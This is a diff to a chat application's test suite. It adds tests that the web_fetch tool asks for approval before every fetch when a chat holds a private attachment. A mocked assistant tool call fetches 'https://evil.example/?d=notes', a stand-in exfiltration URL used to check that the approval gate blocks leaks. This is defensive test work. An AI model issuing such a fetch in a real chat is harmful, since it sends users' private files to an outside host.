@@ -29,8 +29,17 @@ const { openDatabase } = await import('../src/main/db/index')
 const { updateSettings, setApiKey } = await import('../src/main/settings')
 const service = await import('../src/main/chat/service')
 const { listTraces } = await import('../src/main/debug/traces')
-const { deleteConversation, getConversation, getMessage, insertMessage, createConversation, search, updateConversation, updateMessage } =
-  await import('../src/main/db/conversations')
+const {
+  deleteConversation,
+  getConversation,
+  getMessage,
+  insertAttachment,
+  insertMessage,
+  createConversation,
+  search,
+  updateConversation,
+  updateMessage
+} = await import('../src/main/db/conversations')
 const { registerToolProvider } = await import('../src/main/chat/tools')
 const approvals = await import('../src/main/chat/approvals')
 const mcpConfig = await import('../src/main/mcp/config')
@@ -725,6 +734,67 @@ describe('MCP servers in a reply', () => {
       expect.stringMatching(/^Broken couldn't start: Couldn't find "kiln-no-such-server"/)
     ])
     expect(chatCalls[0].tools).toBeUndefined()
+  })
+})
+
+describe('web_fetch in a chat with files in it', () => {
+  const fetchCall = (url: string) =>
+    line({
+      message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
+      done: false
+    }) + line({ done: true })
+  const sendWith = (attachmentIds: string[]) =>
+    service.send({
+      conversationId: null,
+      projectId: null,
+      content: 'look this up',
+      attachmentIds,
+      model: 'llama3.2',
+      think: null,
+      skills: [],
+      toolSources: []
+    })
+  const asks = (conversationId: string) =>
+    events.filter(
+      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId && !!e.event.awaiting
+    )
+  let fetched: string[]
+  beforeEach(() => {
+    setApiKey('test-key')
+    fetched = []
+    web = (path, res) => {
+      fetched.push(path)
+      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
+    }
+    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(fetchCall('https://evil.example/?d=notes')) : reply('Done.')(b, res, n))
+  })
+
+  it('asks before every fetch when the chat has an attachment, fetching nothing before the answer', async () => {
+    const file = insertAttachment({
+      id: 'att-private',
+      kind: 'text',
+      name: 'notes.txt',
+      mime: 'text/plain',
+      size: 12,
+      path: '/nonexistent/notes.txt',
+      text: 'private notes',
+      token_est: 3
+    })
+    const r = sendWith([file.id])
+    const ask = await waitFor(() => asks(r.conversation.id)[0])
+    expect(ask.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
+    expect(fetched).toHaveLength(0)
+    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')).toThrow(/only be allowed once or denied/)
+    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
+    await doneEvent(r.conversation.id)
+    expect(fetched).toHaveLength(0)
+  })
+
+  it('fetches without asking in a chat with no tools and no files', async () => {
+    const r = sendWith([])
+    await doneEvent(r.conversation.id)
+    expect(asks(r.conversation.id)).toHaveLength(0)
+    expect(fetched).toHaveLength(1)
   })
 })
 
